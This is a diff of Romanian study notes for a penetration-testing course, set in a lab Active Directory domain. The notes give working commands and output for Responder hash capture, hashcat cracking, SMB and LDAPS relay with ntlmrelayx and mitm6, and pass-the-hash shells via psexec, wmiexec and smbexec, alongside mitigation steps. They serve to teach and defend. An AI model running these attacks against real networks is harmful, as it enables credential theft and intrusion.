@@ -377,9 +377,6 @@ sudo systemctl status nessusd
 ```
 4. Deschid interfața web în browser la: https://<IP>:8834/
 
-### Run scan:
-#TODO screen la rezultatul scanari 
-
 ## Exploitation Basics:
 ### Reverse Shell vs Bind Shells:
 `Reverse Shell`         - este cel mai raspandit tip de shell atunci cănd victima dorește să se conecteze la mașina noastra este un tip simplu de shell.
@@ -414,11 +411,11 @@ Staged: payload-ul se transmite treptat poate fii mai instabil.
 ``` 
 
 ### Root with Metasploit:
-#TODO exploit samba cu versiuen gasita anterior
+Este procesul este descris in fisierul dat [Kioptrix Walkthrough ](./Walkthrough/Kioptrix_Walkthrough.md)
 
 
 ### Manual Exploitation:
-#TODO de gasit exploiturile pe net-github 
+Este procesul este descris in fisierul dat [Kioptrix Walkthrough ](./Walkthrough/Kioptrix_Walkthrough.md)
 
 ### Brute force:
 În cazul meu o să foloses `hydra`:
@@ -433,13 +430,12 @@ Masinele vulnerabile se pot scoate aici: https://drive.google.com/drive/folders/
 Pentesting for n00bs:                    https://www.youtube.com/watch?v=3aASluoJ-iM&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB
 
 #### Walkthrough list:
-- [Kioptrix](/PJPT%20Certificate/Walkthrough%20/Kioptrix_Walkthrough.md)
-- [Blue Windows](/PJPT%20Certificate/Walkthrough%20/Blue_Walkthrough.md)
-- [Academy](/PJPT%20Certificate/Walkthrough%20/Academy_Walkthrough.md)
-- [Dev](/PJPT%20Certificate/Walkthrough%20/Dev_Walkthrough.md)
-- [Butler](/PJPT%20Certificate/Walkthrough%20/Butler_Walkthrough.md)
-- [Blackpearl](/PJPT%20Certificate/Walkthrough%20/Blackpearl_Walkthrough.md)
-#TODO aici o sa fie cum a fost rezolvat din curs deja in fisierul curent cum a fost rezolvata de mine 
+- [Kioptrix](/PJPT%20Certificate/Walkthrough/Kioptrix_Walkthrough.md) #DONE
+- [Blue Windows](/PJPT%20Certificate/Walkthrough/Blue_Walkthrough.md) #DONE
+- [Academy](/PJPT%20Certificate/Walkthrough/Academy_Walkthrough.md)     #TODO toate de mai jos
+- [Dev](/PJPT%20Certificate/Walkthrough/Dev_Walkthrough.md)
+- [Butler](/PJPT%20Certificate/Walkthrough/Butler_Walkthrough.md)
+- [Blackpearl](/PJPT%20Certificate/Walkthrough/Blackpearl_Walkthrough.md)
 
 ##  Active Directory Overview:
 Active Directory:
@@ -538,22 +534,24 @@ Obiecte în Active Directory:
 | **Shared Folders (Foldere partajate)** | Permite utilizatorilor să caute foldere partajate pe baza proprietăților definite.                          |
 
 ##  Active Directory Lab Build:
-#TODO aici am ramas
 ### ISO Necessary:
 Link: https://www.microsoft.com/en-us/evalcenter
 Instalam rolul de DC + Certificate Authority pe serverul Windows:
 
-```powershell
-C:\Users\Administrator>setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\SQLService
-Checking domain DC=MARVEL,DC=local
+`SPN`                          - Service Principal Name; un identificator unic folosit de Kerberos pentru a lega un serviciu (ex: MSSQL, HTTP, CIFS) de un cont din Active Directory. Permite autentificarea Kerberos și poate fi abuzat pentru atacuri precum Kerberoasting dacă e configurat greșit.
 
+Este o comandă Active Directory folosită pentru a adăuga un SPN (Service Principal Name) unui anumit cont de serviciu.
+```powershell
+setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\SQLService
+Checking domain DC=MARVEL,DC=local
 Registering ServicePrincipalNames for CN=SQL Service,CN=Users,DC=MARVEL,DC=local
         HYDRA-DC/SQLService.MARVEL.local:60111
 Updated object
 ```
 
-```
-C:\Users\Administrator>setspn -T MARVEL.local -Q */*
+Este echivalent cu „arată-mi tot ce are asociat SPN în AD”.
+```powershell
+setspn -T MARVEL.local -Q */*
 Checking domain DC=MARVEL,DC=local
 CN=HYDRA-DC,OU=Domain Controllers,DC=MARVEL,DC=local
         Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/HYDRA-DC.MARVEL.local
@@ -584,14 +582,20 @@ CN=SQL Service,CN=Users,DC=MARVEL,DC=local
 Existing SPN found!
 ```
 
-`SPN` -#TODO what is it?
-
 # Attacking Active Directory: Initial Attack Vectors:
 ## Initial AD Attack Vectors:
 ### LLMNR Poisoning Overview:
-`LLMR `                         -#TODO
-`NBT-NS`                        -#TODO
-`WPAD`                          -#TODO
+`LLMR `                         - Protocol de rezolvare a numelor folosit când DNS nu răspunde; vulnerabil la spoofing și folosit de Responder pentru a captura hash-uri NTLM.
+
+`LLMR Poisoning`                - Atac în care atacatorul răspunde fals la cererile LLMNR din rețea, făcând o stație să se autentifice către el; astfel capturează hash-uri NTLM care pot fi apoi crăckate sau folosite pentru relay.
+
+`NBT-NS`                        - Mecanism vechi de rezolvare a numelor (NetBIOS Name Service); poate fi ușor falsificat pentru a redirecționa traficul către un atacator și pentru a captura autentificări.
+
+
+`WPAD`                          - Protocol pentru descoperirea automată a configurării proxy; poate fi exploatat dacă nu este configurat corect, permițând atacatorului să furnizeze un proxy malițios și să intercepteze traficul.
+
+Vrei să continui și cu:
+
 ```bash
 sudo responder -I tun0 -dwP
 ```
@@ -600,10 +604,13 @@ Dupa ce primim hash-ul o sa avem posibilitatea dea face brut la hash cu `hashcat
 hashcat -m 5600 hashes.txt rockyou.txt
 ```
 
+Memul cu LLMR Poisoning:
+![README-2025-11-20-13-12-02.png](../src/img/README-2025-11-20-13-12-02.png)
 
-![README-2025-11-18-09-56-47.png](../src/img/README-2025-11-18-09-56-47.png)
-![README-2025-11-18-09-57-04.png](../src/img/README-2025-11-18-09-57-04.png)
-![README-2025-11-18-09-58-08.png](../src/img/README-2025-11-18-09-58-08.png)
+
+Attacul dat lucreaza in forma urmatoare:
+
+![README-2025-11-20-11-05-47.png](../src/img/README-2025-11-20-11-05-47.png) 
 
 
 ### Capturing Hashes with Responder:
@@ -615,7 +622,6 @@ Dupa aceasta utilizatorul aceseasa resursa gresita de genu `\\<IP_responder>` si
 
 ```
 [*] [DHCP] Found DHCP server IP: 172.16.49.254, now waiting for incoming requests...
-
 [*] [NBT-NS] Poisoned answer sent to 172.16.49.145 for name MARVEL (service: Domain Master Browser)
 [*] [NBT-NS] Poisoned answer sent to 172.16.49.145 for name MARVEL (service: Domain Master Browser)
 [*] [NBT-NS] Poisoned answer sent to 172.16.49.145 for name MARVEL (service: Domain Master Browser)
@@ -635,7 +641,29 @@ FCASTLE::MARVEL:68e9075bfd1a2253:1711f02fb7eec04d0d1c79d77e75c4dd:01010000000000
 ```
 
 ### LLMNR Poisoning Mitigation:
-![README-2025-11-18-11-32-43.png](../src/img/README-2025-11-18-11-32-43.png)
+
+#### Cea mai eficientă metodă de protecție este dezactivarea LLMNR și NBT-NS.
+Cum dezactivezi LLMNR:
+În Group Policy, mergi la:
+
+Local Computer Policy → Computer Configuration → Administrative Templates → Network → DNS Client și activezi opțiunea „Turn OFF Multicast Name Resolution”.
+
+Cum dezactivezi NBT-NS:
+
+Deschizi setările plăcii de rețea:
+
+Network Connections → Proprietățile adaptorului → TCP/IPv4 → Advanced → WINS și selectezi „Disable NetBIOS over TCP/IP”.
+
+Dacă organizația nu poate renunța la LLMNR / NBT-NS, atunci se recomandă:
+
+Network Access Control (NAC):
+
+Pentru a controla ce dispozitive au voie să se conecteze în rețea.
+
+Parole puternice:
+
+Parole lungi (ideal peste 14 caractere), complexe și care evită termeni comuni.Cu cât parola este mai solidă, cu atât este mai greu pentru un atacator să spargă hash-ul capturat.
+
 Mitigarea atacurilor de tip LLMNR (Link-Local Multicast Name Resolution) și NBT-NS (NetBIOS Name Service)
  **Cea mai bună apărare este dezactivarea LLMNR și NBT-NS:**
 1. **Dezactivarea LLMNR:**
@@ -647,20 +675,36 @@ Mitigarea atacurilor de tip LLMNR (Link-Local Multicast Name Resolution) și NBT
         - _Network Connections_ > _Network Adapter Properties_ > _TCP/IPv4 Properties_ > _Advanced tab_ > _WINS tab_.
     - Selectează opțiunea: **"Disable NetBIOS over TCP/IP"**.
 ![README-2025-11-18-13-53-05.png](../src/img/README-2025-11-18-13-53-05.png)
+
+
 Aceștea sunt pași care trebuie urmați pentru a micșora riscul acestui atac.
 
 
 ### SMB Relay Attacks:
-`SMB`                           - #TODO
-`SMB Relay`                     - #TODO
-![README-2025-11-18-13-49-41.png](../src/img/README-2025-11-18-13-49-41.png)
+`SMB`                           - Protocol de partajare a fișierelor și imprimantelor în rețele Windows; poate fi abuzat pentru atacuri precum SMB Relay dacă SMB signing nu este activat.
+
+`SMB Relay`                     - În loc să spargem (crack-uim) hash-urile capturate cu Responder, putem redirecționa (relay) aceste hash-uri către anumite sisteme din rețea și, în unele cazuri, putem obține acces direct fără a cunoaște parola.
+
+Requirements:
+- SMB signing trebuie să fie dezactivat sau să nu fie impus (not enforced) pe țintă.
+- Credentialele reluate (relayed user credentials) trebuie să fie de administrator pe mașina țintă pentru a avea valoare reală (pentru a putea executa acțiuni privilegiate).
+
 Pentru a starta acest tip de attack trebuie sa configuram fisierul `nano /usr/share/responder/Responder.conf`
+
+![README-2025-11-18-14-15-42.png](../src/img/README-2025-11-18-14-15-42.png)
+Suntem interesati in 2 setari:
+```
+SMB = Off
+HTTP = Off
+```
+
 Identify Hosts without SMB Signing:
 ```bash
 nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
 ```
 ![README-2025-11-18-14-15-04.png](../src/img/README-2025-11-18-14-15-04.png)
-![README-2025-11-18-14-15-42.png](../src/img/README-2025-11-18-14-15-42.png)
+
+Cu scripturile la `nmap` putem depista hosturile care nu semneaza `smb` si sa le scriem intrun fisier ca `target.txt`:
 
 Instalam srcipturile `impacket-*`:
 ```bash
@@ -669,6 +713,234 @@ sudo apt install impacket-scripts
 
 ```bash
 impacket-ntlmrelayx -tf target.txt -smb2support
-impacket-ntlmrelayx -tf target.txt -smb2support -i # to get shell we can use -i 
+impacket-ntlmrelayx -tf target.txt -smb2support -i # to get shell we can use -i si pe urma nc -lvnp <portul_care_este_returnat_de_ntlmrelayx>
 impacket-ntlmrelayx -tf target.txt -smb2support -c "whoami" # rulam de odata comanda dorita  
+```
+### SMB Relay Attacks Defenses:
+1. Activează SMB Signing pe toate dispozitivele
+- Pro: Blochează complet atacul
+- Contra: Poate cauza probleme de performanță la transferurile de fișiere
+
+2. Dezactivează autentificarea NTLM în rețea
+- Pro: Blochează complet atacul
+- Contra: Dacă Kerberos încetează să funcționeze, Windows revine automat la NTLM
+
+3. Account tiering (separarea nivelurilor de conturi)
+
+- Pro: Limitează accesul administratorilor de domeniu doar la anumite task-uri
+(ex.: se loghează doar pe serverele care chiar necesită privilegii DA)
+- Contra: Poate fi dificil de implementat și aplicat consecvent
+ 
+4. Restricționarea administratorilor locali
+
+- Pro: Poate preveni o mare parte din mișcarea laterală
+- Contra: Poate crește numărul de tichete / probleme raportate la service desk
+
+### Gaining Shell Access:
+Sunt multe metode de-a primi un shell pe host o sa discutam despre `msfconsole` shell in cazul acesta:
+
+Folosim modulul din msfconsole `windows/smb/psexec` setam optiunele pentru RHOST si altele pe urma `exploit`:
+![README-2025-11-21-09-35-37.png](../src/img/README-2025-11-21-09-35-37.png)
+Pentru a primi un shell pe hosturile noastre putem sa folosim si utilita `psexec.py` in felul urmator:
+```bash
+psexec.py marvel.local/fcastle:'Password1'@<IP_addresa>
+```
+![README-2025-11-21-09-38-27.png](../src/img/README-2025-11-21-09-38-27.png)
+
+In utilitele date avem posibilitatea sa folosim nu doar `passwordul` dar putem sa folosim de odata si `hash`-ul pentru a ne loga si a primi un shell:
+```bash
+psexec.py administrator@<IP> -hashes LM:NT
+```
+![README-2025-11-21-09-41-13.png](../src/img/README-2025-11-21-09-41-13.png)
+
+In modulele de `msfconsole` la fel avem posibilitatea sa folosim un hash in loc de parola directa:
+
+![README-2025-11-20-15-31-15.png](../src/img/README-2025-11-20-15-31-15.png)
+
+Mai avem un tool pentru a primi un shell pe host:
+```bash
+wmiexec.py administrator@<IP> -hashes LM:NT 
+```
+
+![README-2025-11-20-15-34-10.png](../src/img/README-2025-11-20-15-34-10.png)
+
+Toolul dat la fel este pentru a generea un shell pe host `smbexec.py`:
+```bash
+smbexec.py administrator@<IP> -hashes LM:NT
+```
+![README-2025-11-20-15-34-36.png](../src/img/README-2025-11-20-15-34-36.png)
+```bash
+
+```
+
+###  IPv6 Attacks Overview:
+`LDAP Relay`        - Atac în care atacatorul folosește autentificarea NTLM primită de la o victimă și o retransmite (relay) către un server LDAP/LDAPS din Active Directory. Dacă signing nu este impus, atacatorul poate modifica atribute AD (ex. adăugare utilizatori la grupuri, schimbarea parolelor, delegări).
+
+`Mitm6`             - Instrument de atac care exploatează preferința Windows pentru IPv6. Atacatorul creează un server IPv6 fals (rogue DHCPv6/DNS) și redirecționează traficul victimei. În combinație cu NTLM Relay, poate trimite autentificarea victimei către DC și obține acces privilegiat.
+
+
+### IPv6 DNS Takeover via mitm6:
+Install `mitm6`:
+```bash
+sudo pip2 install mitm6
+# sau 
+sudo apt install mitm6
+```
+Rularea tipului de attack relay:
+```bash
+impacket-ntlmrelayx -6 -t ldaps://172.16.49.144 -wh fakewpad.marve.local -l lootme 
+...
+
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+...
+```
+
+Rulam si attackul de mitm pentru a prinde hash-urile:
+```bash
+sudo mitm6 -d marvel.local
+...
+Starting mitm6 using the following configuration:
+Primary adapter: eth0 [00:0c:29:46:c7:6a]
+IPv4 address: 172.16.49.143
+IPv6 address: fe80::75a2:c2dd:e312:bfa3
+DNS local search domain: marvel.local
+DNS allowlist: marvel.local
+IPv6 address fe80::9991:1 is now assigned to mac=00:0c:29:5f:12:82 host=HYDRA-DC.MARVEL.local. ipv4=
+IPv6 address fe80::9991:2 is now assigned to mac=00:0c:29:03:5f:85 host=SPIDERMAN.MARVEL.local. ipv4=
+...
+```
+Dupa ce sunt setate toolurile date este nevoie sa facem un reboot la unul din useri. Dupa asta o sa putem vedea ceva de genul dat:
+![README-2025-11-20-16-36-41.png](../src/img/README-2025-11-20-16-36-41.png)
+
+`ntlmrelay` trebuie sa ne returneze ceva de genul dat:
+![README-2025-11-20-16-47-59.png](../src/img/README-2025-11-20-16-47-59.png)
+
+![README-2025-11-20-16-44-21.png](../src/img/README-2025-11-20-16-44-21.png)
+Ideiea consta in aceea ca daca nu a fost nici o logare este posibil sa avem un account de honeypot 
+
+### IPv6 Attack Defenses:
+1. Blochează traficul IPv6 abuzat de mitm6 (dacă nu folosești IPv6 intern)
+
+        Atacurile de tip IPv6 poisoning (ex: mitm6) profită de faptul că Windows face automat interogări IPv6 chiar și în rețele doar IPv4.
+        Dacă organizația nu folosește IPv6, cea mai sigură metodă este:
+
+        🔹 Blochează în firewall (prin GPO) următoarele tipuri de trafic:
+
+            Inbound → DHCPv6
+            Core Networking – Dynamic Host Configuration Protocol for IPv6 (DHCPv6-In)
+            Inbound → Router Advertisement
+            Core Networking – Router Advertisement (ICMPv6-In)
+            Outbound → DHCPv6
+            Core Networking – Dynamic Host Configuration Protocol for IPv6 (DHCPv6-Out)
+
+Acest lucru previne atacatorul să se prezinte ca DNS/DHCPv6 fals (ce face mitm6).
+
+⚠ Dezactivarea completă a IPv6 poate crea efecte nedorite, de aceea blocarea traficului recomandat este preferată.
+
+2. Dezactivează WPAD dacă nu este folosit
+
+        Dacă organizația nu folosește WPAD:
+        dezactivează-l prin Group Policy
+        dezactivează serviciul WinHttpAutoProxySvc
+        Asta previne atacuri în care un server WPAD fals redirecționează traficul victimei.
+
+3. Blochează LDAP Relay
+
+        Relay-ul către LDAP/LDAPS poate fi prevenit DOAR prin:
+        activarea LDAP Signing
+        activarea LDAP Channel Binding
+        Fără aceste două setări → DC-ul poate accepta NTLM Relay.
+
+4. Protejează conturile sensibile
+
+        Pune utilizatorii administrativi în Protected Users
+        SAU
+        marchează conturile ca „Account is sensitive and cannot be delegated”
+
+Asta previne impersonarea lor prin relay/delegare abuzivă.
+
+### Passback Attacks:
+A Pen Tester’s Guide to Printer Hacking - https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/
+
+### Initial Internal Attack Strategy:
+1. Begin the day with mitm6 or Responder
+
+Start by running mitm6 or Responder to catch NTLM traffic early.
+These tools work best when users start logging in and generating network activity.
+
+2. Run scans to generate traffic
+
+Perform network scans (Nmap, Masscan, etc.) to stimulate additional traffic.
+More traffic = more chances to capture credentials or relay authentication.
+
+3. If scans take too long, look for websites in scope
+
+If scanning is slow, enumerate websites or web services quickly using something like:
+
+        http_version
+        lightweight web scanners
+        banner grabbing
+        Web services often reveal easy entry points.
+
+4. Look for default credentials on web logins
+
+Always check internal admin panels or devices for factory-default credentials:
+
+        Printers
+        Jenkins
+        Cameras
+        Switches / Routers
+        Web dashboards
+        Anything with a login page
+        These are common and often overlooked.
+
+5. Think outside the box
+
+Be creative.
+Try unusual attack paths, forgotten systems, weird ports, abandoned applications — internal networks often have many misconfigurations.
+
+![README-2025-11-21-10-16-18.png](../src/img/README-2025-11-21-10-16-18.png)
+
+## Attacking Active Directory: Post-Compromise Enumeration:
+✔ There are a few tools that offer quick and efficient enumeration:
+
+        BloodHound
+        PlumHound
+        ldapdomaindump
+        PingCastle
+        And whatever else your heart desires
+### Domain Enumeration with ldapdomaindump:
+#TODO descriere
+```bash
+sudo ldapdomaindump ldaps://<IP> -u 'MARVEL\fcastle' -p Password1
+```
+
+### Domain Enumeration with Bloodhound:
+Install bloodhound:
+```bash
+pip isntall bloodhound
+#sau prin apt
+sudo apt intall bloodhound
+``` 
+Rulam `neo4j` pentru baza de date:
+```bash
+sudo neo4j console
 ```
